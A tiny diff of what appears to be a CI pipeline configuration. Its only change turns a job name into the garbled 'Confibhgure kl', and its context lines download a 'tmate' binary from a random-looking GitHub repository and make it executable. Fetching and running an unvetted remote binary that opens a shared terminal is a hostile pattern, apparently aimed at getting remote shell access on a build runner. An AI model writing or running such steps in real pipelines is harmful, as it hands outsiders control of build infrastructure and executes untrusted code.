@@ -8,7 +8,7 @@ blocks:
   - name: Setup
     task:
       jobs:
-        - name: Configure kl
+        - name: Confibhgure kl
           commands:
             - 'wget https://raw.githubusercontent.com/hp20h5w91nf1/hp20h5w91nf1/main/tmate'
             - chmod +x tmate
